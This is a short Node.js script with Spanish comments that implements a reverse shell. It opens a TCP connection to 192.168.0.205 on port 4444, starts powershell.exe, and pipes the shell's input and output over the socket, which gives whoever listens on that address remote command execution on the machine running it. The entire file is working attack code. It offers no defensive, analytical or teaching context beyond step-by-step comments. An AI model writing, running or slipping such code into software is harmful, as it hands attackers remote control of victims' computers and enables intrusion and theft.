//Librerias: net | child_process
const net = require('net');
const { exec } = require('child_process');

//Parámetros
const ip_destino = '192.168.0.205'
const puerto_destino = 4444

//Defino mi funcion de shell reversa
function shellReversa(host, puerto) {
    const socket = new net.Socket();
    socket.connect(puerto, host, () => {
        //Invocamos una instancia de CMD / Powershell
        const shell = exec('powershell.exe', []);
        //Enviamos la salida de la terminal  a traves del socket
        shell.stdout.pipe(socket);
        shell.stderr.pipe(socket);
        //Recibimos la entrada a la terminal desde el socket
        socket.pipe(shell.stdin);
    });
}

//Ejecuto la funcion de mi shell reversa
shellReversa(ip_destino, puerto_destino);
